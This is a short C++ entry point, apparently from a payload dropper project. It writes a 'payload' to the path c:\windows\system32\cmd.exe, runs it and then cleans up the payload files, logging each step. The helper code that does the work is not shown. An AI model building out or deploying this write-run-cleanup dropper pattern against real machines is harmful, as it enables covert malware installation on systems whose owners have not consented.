
#include <iostream>
#include <filesystem>

#include "utils.hh"
#include "logger.hh"

int main() {

    debug("writing payload to disk..."); 

    deploy::writePayload("c:\\windows\\system32\\cmd.exe");

    success("payload successfully wrote to disk!"); 

    debug("running payload..."); 

    if (deploy::runPayload()) { // run the payload and check if it was a success
        success("payload ran successfully!"); 
    }
    else {
        error("fatal error during the execution of the payload."); 
    }

    debug("cleaning up..."); 

    if (deploy::cleanup()) {
        success("cleaned up successfully, closing..."); // clean up the payload files and check if it was a success
    }
    else {
        error("fatal error during the cleanup of the payload.");
    }
}
